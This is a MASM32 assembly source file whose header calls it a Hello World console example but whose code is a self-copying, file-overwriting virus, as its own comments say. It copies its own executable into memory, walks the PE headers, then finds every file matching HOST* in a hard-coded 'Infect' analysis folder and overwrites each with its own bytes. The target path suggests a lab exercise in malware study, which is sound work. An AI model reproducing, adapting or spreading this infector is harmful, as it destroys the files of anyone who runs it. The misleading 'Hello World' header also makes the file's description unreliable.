; *************************************************************************
; 32-bit Windows Console Hello World Application - MASM32 Example
; EXE File size: 2,560 Bytes
; Created by Visual MASM (http://www.visualmasm.com)
; *************************************************************************
                                    
.386					; Enable 80386+ instruction set
.model flat, stdcall	; Flat, 32-bit memory model (not used in 64-bit)
option casemap: none	; Case insensitive syntax

; *************************************************************************
; MASM32 proto types for Win32 functions and structures
; *************************************************************************  
include c:\masm32\include\kernel32.inc
include c:\masm32\include\windows.inc
include c:\masm32\include\masm32.inc
include c:\masm32\include\msvcrt.inc

printf PROTO C, :VARARG
sprintf PROTO C, :VARARG
strcmp PROTO C, lpstr1:DWORD, lpstr2:DWORD
                                  
; *************************************************************************
; MASM32 object libraries
; *************************************************************************  
includelib c:\masm32\lib\kernel32.lib
includelib c:\masm32\lib\masm32.lib  
includelib c:\masm32\lib\msvcrt.lib  

; *************************************************************************
; Our data section. Here we declare our strings for our message
; *************************************************************************
.data
	lpcstrFileName  	db "C:\Users\user\Desktop\Analysis\Morgue\Infect\HOST*",0
	lpcstrFileFullPath  db "C:\Users\user\Desktop\Analysis\Morgue\Infect\%s",0
	lpcstrFileFullPathVirus  db "C:\Users\user\Desktop\Analysis\Morgue\Infect\%d",0
	lpcstrFileFullPathBuffer db 200 dup(0)
	lpcstrFileFullPathBufferVirus db 200 dup(0)
	lpcstrPrint		db "File handle: %x", 10, 0
	lpcstrName		db "Infecting file: %s", 10, 0
	lpcstre_magic	db "e_magic: %s", 10, 0
	lpcstrpe_magic	db "NT_HEADERS Magic: %s", 10, 0
	lpcstrMachine	db "FILE HEADER Machine: %x", 10, 0
	lpcstrOPMagic	db "OPTIONAL HEADER Magic: %x", 10, 0
	lpcstrInfection db "File %s is overwritten!", 10, 0
	lpcstrError		db "GetLastError code: %d", 10, 0
	hSearchHandle	dd 0        
	hFileHandle     dd 0
	hSelfFileHandle     dd 0
	lpMemory		dd 0
	dwImageBase		dd 0
	dwImageSize		dd 0
 	gFindData 	WIN32_FIND_DATA <>

; *************************************************************************
; Our executable assembly code starts here in the .code section
; *************************************************************************
.code

start:
	; Use the StdOut API function to display the text in a console.
	                                    
LOAD:
	;Get the base address of the current running process(or the virus)                
	invoke GetModuleHandleA, NULL
	
	;Save ImageBase inside dwImageBase
	mov [dwImageBase], eax 
	
	;Save the name of the current file
	invoke GetModuleFileNameA, NULL, addr lpcstrFileFullPathBuffer, 200
	
	;Get the current tick count
	invoke GetTickCount
	
	;Create new file name with path
	invoke sprintf, addr lpcstrFileFullPathBufferVirus, addr lpcstrFileFullPathVirus, eax
	
	;Copy virus to new file
	invoke CopyFileA, addr lpcstrFileFullPathBuffer, addr lpcstrFileFullPathBufferVirus, 0
	
	;Open a handle to the new virus file
	invoke CreateFileA, addr lpcstrFileFullPathBufferVirus,
								GENERIC_READ, 
								0, 
								0, 
								OPEN_EXISTING,
								FILE_ATTRIBUTE_NORMAL,
								NULL
	cmp eax, INVALID_HANDLE_VALUE
	jz ERR
	mov [hSelfFileHandle], eax
								
	invoke GetFileSize, eax, NULL
	test eax, eax
	jz ERR
	mov [dwImageSize], eax
	
	invoke VirtualAlloc, NULL, eax, MEM_COMMIT, PAGE_READWRITE
	mov [lpMemory], eax
	test eax, eax
	jz ERR
	
	invoke ReadFile, [hSelfFileHandle], eax, [dwImageSize], addr dwImageSize, NULL
	test eax, eax
	jz ERR
	
	invoke CloseHandle, [hSelfFileHandle]
	
	invoke DeleteFileA, addr lpcstrFileFullPathBufferVirus
	test eax, eax
	jz ERR 
	

EXTRACT_PE:	
 	
 	mov eax, [dwImageBase]
	invoke printf, addr lpcstre_magic, eax
	
	mov eax, [dwImageBase]
	mov ebx, [dwImageBase] 
	add ebx, 3ch ;Add e_lfanew RVA
	add eax, [ebx] ;Advance to Signature in NT_HEADERS
	xchg eax, ebx
	invoke printf, addr lpcstrpe_magic, ebx
	
	mov eax, ebx ;Pass NT_HEADERS 
	add eax, 4  ;Advanced to FILE_HEADER
	mov eax, [eax] ;Get Machine value
	xor ecx, ecx
	mov cx, ax
	invoke printf, addr lpcstrMachine, ecx
	
	add ebx, 18h ;Advance to OPTIONAL_HEADER
	mov eax, [ebx] ;Get Magic value
	xor ecx, ecx
	mov cx, ax
	invoke printf, addr lpcstrOPMagic, ecx
	
	add ebx, 38h ;Advance to SizeOfImage
	mov ebx, [ebx] ;Get SizeOfImage value
	mov edi, ebx
	mov [dwImageSize], ebx ;Store ImageSize
	
FIRST:
	
	;Get the name of the virus executing file
	invoke GetModuleFileNameA, NULL, addr lpcstrFileFullPathBufferVirus, 200
	
	invoke FindFirstFileA, addr lpcstrFileName, addr gFindData ;Get the first file
	test eax, eax
	jz ERR
	mov [hSearchHandle], eax ;Save the files search handle
	invoke printf, addr lpcstrPrint, eax
	jmp FIND
	
NEXT:
	invoke FindNextFileA, [hSearchHandle], addr gFindData  ;Find the next file
	test eax, eax
	jz ERR
	jmp FIND
                                    
FIND:
	
	;Construct full file path
	invoke sprintf, addr lpcstrFileFullPathBuffer, addr lpcstrFileFullPath, addr gFindData.cFileName
	
	;Compare the found file to virus file
	invoke strcmp, addr lpcstrFileFullPathBuffer, addr lpcstrFileFullPathBufferVirus
	test eax, eax 
	jz NEXT
	
	invoke CreateFileA, addr lpcstrFileFullPathBuffer, ;Open a handle to the file
								FILE_ALL_ACCESS, 
								0, 
								0, 
								OPEN_EXISTING,
								FILE_ATTRIBUTE_NORMAL,
								NULL
	cmp eax, INVALID_HANDLE_VALUE
	jz ERR
	mov [hFileHandle], eax
	
	;Open handle to found file
	invoke printf, addr lpcstrName, addr gFindData.cFileName ;Print found file name
		
WRITE:
	;Overwrite found file with our file
	invoke WriteFile, [hFileHandle], [lpMemory], 0FF0h, NULL, NULL 
	test eax, eax
	JZ ERR
	invoke printf, addr lpcstrInfection, addr gFindData.cFileName
	jmp NEXT

ERR:
	invoke GetLastError
	mov ebx, eax
	invoke printf, addr lpcstrError, eax   

EXIT:
	; When the console has been closed, exit the app with exit code 0
    invoke ExitProcess, ebx
end start
